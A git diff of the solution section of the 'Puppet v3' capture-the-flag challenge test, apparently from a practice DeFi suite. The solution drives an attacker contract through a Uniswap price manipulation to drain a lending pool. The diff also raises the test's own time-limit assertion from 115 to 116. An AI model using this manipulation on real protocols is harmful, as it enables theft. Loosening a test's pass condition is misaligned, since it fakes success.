@@ -142,12 +142,7 @@ describe('[Challenge] Puppet v3', function () {
         /** CODE YOUR SOLUTION HERE */
 
         // Deploy our HackPuppetV3 contract
-        hackPuppetv3 = await (await ethers.getContractFactory('HackPuppetV3', player)).deploy(
-            weth.address,
-            token.address,
-            uniswapPool.address,
-            lendingPool.address
-        );
+        hackPuppetv3 = await (await ethers.getContractFactory('HackPuppetV3', player)).deploy();
         
         // Transfer all our token balance to our hacker contract
         await token.connect(player).transfer(hackPuppetv3.address, PLAYER_INITIAL_TOKEN_BALANCE);
@@ -156,13 +151,20 @@ describe('[Challenge] Puppet v3', function () {
         // Sqrt is the max price difference we allow and
         // That's the price difference we're going to generate making the swap
         await hackPuppetv3.connect(player).swap(
+            uniswapPool.address,
+            token.address,
             PLAYER_INITIAL_TOKEN_BALANCE,
             encodePriceSqrt(1, LENDING_POOL_INITIAL_TOKEN_BALANCE)
         );
         // Increse time because the price change lates ten minutes in fully make effect
-        await time.increase(110);
+        await time.increase(111);
         // Call our contract function that is going to borrow from the lendingPool and transfer to us
-        await hackPuppetv3.connect(player).borrowAndTransfer(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        await hackPuppetv3.connect(player).borrowAndTransfer(
+            lendingPool.address,
+            LENDING_POOL_INITIAL_TOKEN_BALANCE,
+            weth.address,
+            token.address
+        );
     });
 
     after(async function () {
@@ -171,7 +173,7 @@ describe('[Challenge] Puppet v3', function () {
         // Block timestamp must not have changed too much
         expect(
             (await ethers.provider.getBlock('latest')).timestamp - initialBlockTimestamp
-        ).to.be.lt(115, 'Too much time passed');
+        ).to.be.lt(116, 'Too much time passed');
 
         // Player has taken all tokens out of the pool        
         expect(
